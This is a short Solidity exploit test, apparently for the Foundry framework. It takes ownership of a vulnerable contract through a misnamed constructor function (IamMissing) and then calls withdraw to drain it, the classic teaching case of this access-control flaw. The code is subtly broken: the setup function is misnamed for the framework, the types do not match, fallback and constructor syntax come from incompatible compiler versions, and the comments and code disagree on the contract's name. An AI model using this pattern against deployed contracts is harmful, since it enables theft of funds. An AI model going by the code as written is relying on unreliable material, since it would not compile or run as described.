import "forge-std/Test.sol";

contract Exploit is Test {
    address private zaimaAddress;

    constructor() public {}

    function setup() public {
        zaimaAddress = new Missing();
    }

    function () payable {}

    function test_exploit() public {
        // Break the access control of Zaima by elevating the privileges of the exploit contract

        // Call the IamMissing function of the Zaima contract
        // This function should only be callable by the owner, but we are able to call it
        // because the constructor name is incorrect
        Missing(zaimaAddress).IamMissing();

        // Now the exploit contract is recognized as the owner of the Zaima contract
        // and can call the withdraw function
        Missing(zaimaAddress).withdraw();
    }
}